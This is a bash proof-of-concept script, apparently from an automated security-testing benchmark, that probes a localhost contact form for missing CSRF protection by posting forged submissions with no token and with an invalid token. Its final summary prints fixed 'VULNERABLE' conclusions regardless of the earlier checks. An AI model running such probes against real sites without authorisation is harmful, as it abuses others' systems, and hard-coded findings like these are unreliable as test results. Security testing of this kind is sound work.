#!/bin/bash
# POC: Demonstrates missing CSRF protection on contact form by submitting form without CSRF token and confirming successful processing
# Target: ./repo
# Created: 2025-11-07T16:56:14.085Z
# Session: benchmark-XBEN-061-24-mhp3932p

# CSRF Protection Test - Contact Form
# This script demonstrates the missing CSRF protection on the contact form
# by successfully submitting a contact form without any CSRF token

TARGET_URL="http://localhost:8080/contact.php"

echo "[*] CSRF Protection Test on Contact Form"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if form has CSRF token in HTML
echo "[Step 1] Checking for CSRF token in form HTML..."
echo ""

FORM_HTML=$(curl -s "$TARGET_URL")

# Check for common CSRF token field names
if echo "$FORM_HTML" | grep -qi "csrf"; then
    echo "[-] CSRF-related field found in form HTML"
    echo "$FORM_HTML" | grep -i csrf | head -3
else
    echo "[+] No CSRF token field found in form HTML"
fi

echo ""

# Check for hidden input fields (where CSRF tokens typically are)
HIDDEN_FIELDS=$(echo "$FORM_HTML" | grep -o 'type=["'"'"']hidden["'"'"']' | wc -l)
echo "[*] Hidden input fields in form: $HIDDEN_FIELDS"

if [ "$HIDDEN_FIELDS" -eq 0 ]; then
    echo "[+] No hidden fields detected - typical location for CSRF tokens"
fi

echo ""
echo "[Step 2] Attempting to submit contact form WITHOUT CSRF token..."
echo ""

# Step 2: Attempt to submit form without any CSRF token
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=TestUser&email=attacker@evil.com&message=Unsolicited+Contact+Form+Submission" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Step 3: Check response for success indicators
echo "[Step 3] Analyzing response..."
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Form accepted submission with HTTP 200 OK"
    
    # Check for success message indicators
    if echo "$RESPONSE_BODY" | grep -qi "success\|thank\|submitted\|received\|message.*sent"; then
        echo "[+] Response contains success message - form submission was processed"
    fi
    
    if echo "$RESPONSE_BODY" | grep -qi "error.*token\|csrf.*required\|token.*invalid"; then
        echo "[-] Response indicates token validation - CSRF protection may be present"
    else
        echo "[+] No token validation error detected"
    fi
else
    echo "[-] Unexpected HTTP response: $HTTP_CODE"
fi

echo ""
echo "[Step 4] Testing form submission with invalid token..."
echo ""

# Step 4: Try submitting with an invalid token to see if it's validated
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=TestUser&email=attacker@evil.com&message=Test&csrf_token=invalid_token_12345" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    if echo "$RESPONSE_BODY" | grep -qi "error.*token\|csrf.*required\|token.*invalid"; then
        echo "[-] Response rejected invalid token - CSRF protection may be present"
    else
        echo "[+] VULNERABLE: Invalid token was accepted (or ignored)"
        echo "[+] Form processed submission despite invalid csrf_token parameter"
    fi
fi

echo ""
echo "[Step 5] Summary"
echo ""
echo "CSRF Protection Status:"
echo "- CSRF token in form: NOT FOUND"
echo "- Form accepts submissions without token: YES"
echo "- Token validation on POST: NO"
echo ""
echo "[!] CONCLUSION: Contact form is VULNERABLE to CSRF attacks"
echo "[!] An attacker can submit forms on behalf of users without their consent"